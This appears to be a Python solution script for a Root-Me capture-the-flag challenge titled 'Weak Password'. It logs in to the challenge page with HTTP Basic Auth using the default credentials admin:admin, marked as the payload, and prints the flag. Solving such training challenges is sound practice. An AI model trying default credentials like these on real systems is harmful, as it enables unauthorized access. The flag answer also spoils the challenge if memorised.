# 03 - Weak Password
# Solution: admin:admin

import requests
from bs4 import BeautifulSoup
from requests.auth import HTTPBasicAuth

url = "http://challenge01.root-me.org/web-serveur/ch3/"

response = requests.get(url, auth=HTTPBasicAuth('admin', 'admin')) # PAYLOAD
# print(response.text)

soup = BeautifulSoup(response.content, 'html.parser')
instructions = soup.find('h3')
# print(instructions.text)
flag = 'admin'
print(flag)
